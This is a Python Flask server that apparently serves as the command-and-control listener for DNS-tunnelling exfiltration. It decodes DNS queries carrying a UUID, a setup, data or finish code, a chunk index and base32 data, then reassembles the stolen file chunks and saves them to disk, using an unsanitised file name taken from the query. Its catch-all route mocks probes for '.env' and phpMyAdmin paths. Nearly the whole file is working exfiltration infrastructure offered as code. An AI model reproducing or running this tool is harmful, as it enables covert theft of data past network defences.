# def main():
#     print('main')
# if __name__ == '__main__':
#     main()
import dns.message
import dns.asyncquery
import dns.asyncresolver
import dns.rdata
from dns.exception import Timeout
import base64
import dns.name

from flask import Flask, render_template, request
import os
from os import listdir
from random import randint
import time


app = Flask(__name__)
PATH = os.getcwd()

file_uuids = []
file_chunks = {}
num_chunks = 0


@app.route('/dns', methods=['GET', 'POST'])
def return_dns():
    if request.method == "POST":
        print('taht was a post')
        print(request.values)
    elif request.method == "GET":
        # print(request.args)
        query = request.args.get('dns')
        query = query + "==="
        message = base64.b64decode(query)

        dns_message = dns.name.from_wire(message,12)[0]
        
        dns_message_str = str(dns_message) 
        info = dns_message_str.split('.')
        """
        #this query is destined for this listener, need to extra the UUID to
        determine if the file is already in transit or a new file, then start receiving the data
        
        dns query format:
        C2 codes
        A = setup query
        D = data query
        Z = file upload finished
        1. send setup_query, coded with A and number of file chunks
        2. send file_chunk_query, coded with D, each file chunk identified by its index
        3. send finish_query query with Z, denoting complete

        setup_query = UUID.CODE.NUMCHUNKS.TOPLEVELDOMAIN.com
        data_query = UUID.CODE.index.file_data.TOPLEVELDOMAIN.com
        finish_query = UUID.code.final_index.topleveldomain.com
        """

        #info[0] = uuid
        #info[1] = c2code
        #info[2] = index
        uuid = info[0]

        if uuid not in file_chunks.keys():
            file_chunks[uuid] = []

        c2code = info[1]

        index = int(info[2])

        if c2code == 'A':
            global num_chunks
            num_chunks = index
            print("Num chunks = ", num_chunks)
            print("start of file, num_chunks = ", num_chunks)
            file_chunks[uuid] =  [None] * num_chunks    #create the list with the total index length
            print("The length of the file_chunks list is: ", len(file_chunks[uuid]))

        if c2code == 'D':
            #print("UUID: ", uuid)
            #print("INDEX: " , index)
            #print("INFO: " , info[3])
            file_chunks[uuid][index] = info[3]
            #print(file_chunks[uuid][index])
        
        if c2code == 'Z':
            print('end of file')
            #print(file_chunks[uuid])
            save_base32_file(uuid, file_chunks[uuid])



        #print(dns_message.labels)
        return "Hello dns"
def save_base32_file(file_name, file_data):
    #saves a file with name file_name, going over a list of data chunks that are base32 encoded, 
    # converts them back to byte data, and saves the file
    f = open(f"receive/{file_name}", 'wb')
    for data in file_data:
        #first, convert from b32 back to data string
        #then, conver str to byte data
        #then, write to file
        b32_decode_str = base64.b32decode(data)
        print(b32_decode_str)
        #b#yte_data = str.encode(b32_decode_str)
        #p#rint(byte_data)
        f.write(b32_decode_str)
    f.close()




@app.route('/', methods=['GET', 'POST'])
def return_index():
    return "index"

@app.route('/<path:path>')
def catch_all(path):
    if '.env' in path:
        return "Not today, batman"
    elif '.phpmyadmin' in path:
        return 'that was rude'
    else:
        quote = "all your base are belong to us"
        print(f'The quote is type: {type(quote)} and this is the quote: {quote}')
        time.sleep(1)
        return quote

    return 'all your base are belong to us'
    
if __name__ == "__main__":
    app.run()

